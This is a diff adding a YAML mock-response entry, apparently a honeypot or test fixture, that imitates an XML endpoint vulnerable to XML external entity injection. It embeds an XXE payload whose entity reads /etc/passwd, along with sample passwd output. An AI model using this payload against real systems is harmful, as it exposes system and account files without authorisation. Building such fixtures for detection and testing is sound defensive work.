@@ -1,0 +1,18 @@
+# XXE (XML External Entity) 注入探测
+- method: POST
+  path: "/api/xml"
+  status: 200
+  content-type: application/xml
+  headers:
+    Server: "Apache/2.4.57"
+  body: |
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [
+      <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    <response>
+      <status>success</status>
+      <message>XML processed successfully</message>
+      <file>root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</file>
+    </response>
